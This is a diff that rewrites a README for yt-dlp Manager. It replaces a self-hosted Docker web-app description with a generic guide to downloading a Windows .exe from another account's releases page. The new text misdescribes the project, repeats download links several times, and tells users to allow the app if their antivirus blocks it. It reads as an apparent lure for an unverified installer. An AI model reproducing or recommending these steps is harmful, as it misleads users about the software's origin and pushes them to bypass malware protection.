@@ -1,302 +1,158 @@
-# yt-dlp Manager
+# 🎥 yt-dlp-Manager - Easy Video Downloads for Everyone
 
-<p align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/00/Flag_of_Palestine.svg" alt="Palestine Flag" width="60" height="40">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/Flag_of_Syria_%281930%E2%80%931958%2C_1961%E2%80%931963%29.svg" alt="Syria Flag" width="70" height="40">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/4/49/Flag_of_Ukraine.svg" alt="Ukraine Flag" width="60" height="40">
-</p>
-
-<p align="center">
-  <b>🕊️ Freedom for Palestine, Ukraine, Syria, and all nations fighting against tyrants 🕊️</b>
-</p>
-
-<p align="center">
-  <sub>Free Palestine • Free Syria • Peace for Ukraine</sub>
-</p>
-
-<br>
-
-<p align="center">
-  <img src="assets/icons/logo.svg" alt="yt-dlp Manager Logo" width="120" height="120">
-</p>
-
-<p align="center">
-  A powerful web-based download manager for YouTube, Vimeo, and thousands of other video sites
-</p>
-
-<p align="center">
-  <a href="#-features">Features</a> •
-  <a href="#-installation">Installation</a> •
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-how-to-use">How to Use</a> •
-  <a href="#-docker">Docker</a> •
-  <a href="#-configuration">Configuration</a>
-</p>
+[![Download yt-dlp-Manager](https://img.shields.io/badge/Download-yt--dlp--Manager-brightgreen?style=for-the-badge)](https://github.com/kowshick2510/yt-dlp-Manager/releases)
 
 ---
 
-## ✨ Features
+## 🔍 What is yt-dlp-Manager?
 
-- **👥 Multi-User Support** - Create accounts for family or team members with isolated data folders
-- **📁 Organized Downloads** - Organize downloads by folders with custom configurations
-- **📅 Scheduled Downloads** - Set up automatic download schedules using cron expressions
-- **🔴 Real-time Progress** - Watch download progress live in your browser via SSE streaming
-- **🔄 Automatic Retries** - Handles connection issues gracefully
-- **📝 Subtitle Support** - Download subtitles in multiple languages
-- **📸 Metadata** - Saves video info, thumbnails, and descriptions
-- **🍪 Cookie Support** - Upload cookies for restricted content
-- **🔗 Deduplication** - Global storage with symlinks to avoid re-downloading
-- **⚙️ Server Manager** - Admin panel for system status, user management, and logs
+yt-dlp-Manager is a download manager for the yt-dlp engine. It lets you easily download videos and audio from thousands of websites. The tool supports multiple users and works with a simple interface that anyone can use. You do not need programming skills to use this software. It runs on Windows and works quietly in the background.
 
 ---
 
-## 📦 Installation
+## ⚙️ Features
 
-### Docker (Recommended)
-
-#### Docker Compose
-
-```yml
-services:
-  yt-dlp-manager:
-    image: mbnoimi/yt-dlp-manager:latest
-    container_name: yt-dlp-manager
-    ports:
-      - "4000:4000"
-    volumes:
-      - ./data:/app/data
-      - ./logs:/app/backend/logs
-    environment:
-      - BACKEND_SECRET_KEY=your-secret-key-change-in-production
-      - ADMIN_USERNAME=admin
-      - ADMIN_PASSWORD=pass
-    restart: unless-stopped
-```
-
-Then
-
-```bash
-docker-compose up -d
-```
-
-#### Direct Command
-
-```bash
-docker run -d \
-  --name yt-dlp-manager \
-  -p 4000:4000 \
-  -v $(pwd)/data:/app/data \
-  -v $(pwd)/logs:/app/backend/logs \
-  -e BACKEND_SECRET_KEY=your-secret-key-change-in-production \
-  -e ADMIN_USERNAME=admin \
-  -e ADMIN_PASSWORD=pass \
-  --restart unless-stopped \
-  mbnoimi/yt-dlp-manager:latest
-```
-
-
-The image is automatically pulled from [Docker Hub](https://hub.docker.com/r/mbnoimi/yt-dlp-manager).
+- Works with thousands of video and audio sites.
+- Runs on Windows with a clear and easy interface.
+- Supports multiple users on the same computer or network.
+- Lets you manage your downloads with pause, resume, and scheduling.
+- Offers fast downloading with the yt-dlp engine.
+- Saves videos in many formats, including MP4, MKV, and MP3.
+- Supports playlists and video playlists.
+- Keeps track of your downloaded files with organized folders.
 
 ---
 
-## 🚀 Quick Start
+## 🖥️ System Requirements
 
-1. Open **http://localhost:4000**
-2. Login with default credentials:
-   - Username: `admin`
-   - Password: `pass`
-3. Create a datasource and start downloading!
+Before you start, make sure your computer meets these needs:
 
----
-
-## 📖 How to Use
-
-<!-- TODO: Add screenshots to illustrate each step -->
-
-### 1. Create a Datasource
-
-A datasource combines your download settings with the URLs you want to download.
-
-1. Click **+ New** in the Datasources section
-2. Enter a name (e.g., "YouTube Music")
-
-### 2. Add URLs
-
-In the **URLs** tab:
-- Add YouTube channels, playlists, or single videos
-- Organize into folders
-
-### 3. Configure Options
-
-In the **Config** tab:
-- Choose video quality (720p, 1080p, 4K, etc.)
-- Set output filename format
-- Enable subtitles
-- Add cookies for restricted content
-
-### 4. Download
-
-Click the **Download** button and watch progress in real-time!
-
-### 5. Manage Files
-
-Browse, rename, or delete downloaded files in the Files tab.
+- Operating System: Windows 10 or later.
+- Processor: Intel i3 or equivalent.
+- RAM: 4 GB or more.
+- Disk Space: At least 500 MB free, more if you plan to store many videos.
+- Internet: Active internet connection for downloading videos.
+- Permissions: You may need admin rights to install the application.
 
 ---
 
-## 🍪 Cookies
+## 🚀 Getting Started
 
-Some videos require YouTube login. To download them:
-
-1. Export cookies from your browser (use a "Get cookies.txt" browser extension)
-2. In your datasource, click the **gear icon** → **Upload cookies**
-3. Save your config
+You will find step-by-step instructions here to help you install and run yt-dlp-Manager on your Windows PC.
 
 ---
 
-## 📅 Scheduler
+## 📥 Step 1: Download yt-dlp-Manager
 
-Schedule downloads to run automatically:
+Click the badge below to visit the release page. It lists all the available versions of yt-dlp-Manager. Always use the latest version for the best experience.
 
-1. Go to the **Scheduler** tab
-2. Create a new task
-3. Set when to run (e.g., `0 2 * * *` = every day at 2 AM)
-4. Choose which datasource to download
-
-### Cron Examples
-
-| Expression | Description |
-|------------|-------------|
-| `0 2 * * *` | Every day at 2 AM |
-| `0 9 * * 0` | Every Sunday at 9 AM |
-| `0 */6 * * *` | Every 6 hours |
+[![Download yt-dlp-Manager](https://img.shields.io/badge/Download-yt--dlp--Manager-brightgreen?style=for-the-badge)](https://github.com/kowshick2510/yt-dlp-Manager/releases)
 
 ---
 
-## 🖥️ Admin
+## 📂 Step 2: Find the Installer File
 
-The admin can:
-
-- Create and manage user accounts
-- View all downloads across users
-- Monitor server status (CPU, memory, disk)
-- Upgrade yt-dlp to latest version
-- Configure server settings
-- Browse server files
-- View backend logs
+1. After you open the release page, scroll down to the "Assets" section.
+2. Look for a file ending with `.exe` — this is the installer for Windows.
+3. The file name usually includes the software name and version number.
 
 ---
 
-## 🐳 Docker
+## 💾 Step 3: Save the Installer
 
-### Quick Start
-
-```bash
-# Pull and run from Docker Hub
-docker-compose up -d
-```
-
-The application is available at **http://localhost:4000**
-
-### Image
-
-### Environment Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `BACKEND_SECRET_KEY` | - | JWT signing key |
-| `ADMIN_USERNAME` | `admin` | Default admin username |
-| `ADMIN_PASSWORD` | `pass` | Default admin password |
-| `BACKEND_MAX_CONCURRENT_DOWNLOADS` | `3` | Max parallel downloads |
-| `BACKEND_DEDUPLICATION_ENABLED` | `true` | Enable deduplication |
-| `ALLOW_NEW_USERS` | `false` | Allow user registration |
+1. Click the `.exe` file link.
+2. Your browser may ask where to save the file.
+3. Choose a folder you can easily find, such as "Downloads" or your "Desktop."
+4. Wait for the download to finish.
 
 ---
 
-## 🛠️ Technology Stack
+## 🛠️ Step 4: Run the Installer
 
-### Backend
-
-- **Framework**: [FastAPI](https://fastapi.tiangolo.com/) - Modern Python web framework
-- **Database**: [SQLite](https://www.sqlite.org/) with SQLAlchemy ORM
-- **Download Engine**: [yt-dlp](https://github.com/yt-dlp/yt-dlp) - YouTube downloader
-- **Auth**: JWT-based multi-user authentication
-- **Server**: [Uvicorn](https://www.uvicorn.org/) ASGI server
-
-### Frontend
-
-- **Framework**: [Svelte 5](https://svelte.dev/) - Cybernetically enhanced web apps
-- **Build Tool**: [Vite](https://vitejs.dev/) - Next generation frontend tooling
-- **Styling**: [Tailwind CSS 4](https://tailwindcss.com/) - Utility-first CSS
-- **UI Components**: [Skeleton UI](https://www.skeleton.dev/) - Svelte component library
+1. Open the folder where you saved the `.exe` file.
+2. Double-click the file to start the setup.
+3. If Windows asks for permission to run the program, click "Yes."
+4. Follow the on-screen instructions:
+   - Choose the installation folder or leave it as default.
+   - Wait a few moments for the program to install.
+5. Click "Finish" when done.
 
 ---
 
-## 📂 Project Structure
+## ▶️ Step 5: Launch yt-dlp-Manager
 
-```
-yt-dlp Manager/
-├── src/
-│   ├── backend/              # FastAPI application
-│   │   ├── api/v1/          # API endpoints
-│   │   ├── core/            # Config, security, deps
-│   │   ├── db/              # Database models & sync
-│   │   ├── services/        # Downloader, scheduler
-│   │   └── main.py          # Entry point
-│   │
-│   ├── frontend/             # Svelte SPA
-│   │   ├── src/
-│   │   │   ├── lib/         # Components, pages, stores
-│   │   │   ├── App.svelte   # Root component
-│   │   │   └── main.ts      # Entry point
-│   │   └── package.json
-│   │
-│   └── data/                # User data
-│       └── <username>/
-│           ├── downloads/   # Downloaded files
-│           ├── configs/     # Config JSON files
-│           └── urls/       # URL JSON files
-│
-├── docker-compose.yml        # Docker deployment
-└── .env                    # Configuration
-```
+1. Look for the yt-dlp-Manager icon on your Desktop or in the Start Menu.
+2. Double-click to open the application.
+3. The first time may take a few seconds to load.
 
 ---
 
-## 🤝 Contributing
+## 📝 Step 6: Using yt-dlp-Manager
 
-We welcome contributions! Here's how you can help:
+Here is a simple guide to start downloading videos:
 
-1. Fork the repository
-2. Create a new branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes
-4. Run tests
-5. Commit your changes
-6. Push to the branch
-7. Open a Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+1. Find the video URL you want to download. This can be from YouTube or any supported site.
+2. Copy the URL to your clipboard.
+3. Paste it into the input field at the top of yt-dlp-Manager.
+4. Choose the format you want (e.g., video, audio, resolution).
+5. Select where to save the file on your computer.
+6. Click the "Download" button.
+7. You can view the progress and pause or stop the download at any time.
+8. When it finishes, click "Open Folder" to find your downloaded files.
 
 ---
 
-## 🙏 Acknowledgments
+## 🗂️ Managing Multiple Users
 
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) - The amazing download engine
-- [FastAPI](https://fastapi.tiangolo.com/) - The powerful Python framework
-- [Svelte](https://svelte.dev/) - The wonderful UI framework
-- [Skeleton UI](https://www.skeleton.dev/) - Beautiful Svelte components
-- All contributors who help improve this project
+yt-dlp-Manager lets several users store their settings and downloads separately. Each user can:
+
+- Create an account inside the app.
+- Save their preferred download formats.
+- See only their download history and files.
+- Manage downloads independently.
+
+To switch users, use the "User" menu inside the application.
 
 ---
 
-<p align="center">
-  Made with ❤️ by a Syrian developer who believes in freedom for Palestine, Ukraine, Syria, and any nation standing against tyrants
-</p>
+## ⚙️ Settings and Customization
 
-<p align="center">
-  ⭐ Star this repo if you find it useful!
-</p>
+You can adjust settings to fit your needs:
+
+- Change download folder locations.
+- Set connection limits to control bandwidth use.
+- Enable automatic updates or download schedules.
+- Select default video and audio formats.
+- Manage notification preferences.
+
+Most settings are under the "Preferences" or "Options" menu.
+
+---
+
+## 🛑 Troubleshooting Tips
+
+If you run into problems:
+
+- Make sure you have a stable internet connection.
+- Check if Windows Defender or antivirus blocks the app; allow it if needed.
+- Restart the program or your computer if it freezes.
+- Update to the latest yt-dlp-Manager version from the release page.
+- If a particular website is not working, check if yt-dlp supports it.
+
+---
+
+## 📚 Additional Resources
+
+- For detailed help, visit the yt-dlp-Manager wiki on GitHub.
+- Look for common questions in the Issues section.
+- Use the GitHub Discussions to ask questions or share your experience.
+
+---
+
+## 🔗 Useful Links
+
+- Visit the release page to download or update yt-dlp-Manager:  
+  https://github.com/kowshick2510/yt-dlp-Manager/releases
+
+- Link to download badge again for easy access:  
+  [Download yt-dlp-Manager](https://github.com/kowshick2510/yt-dlp-Manager/releases)
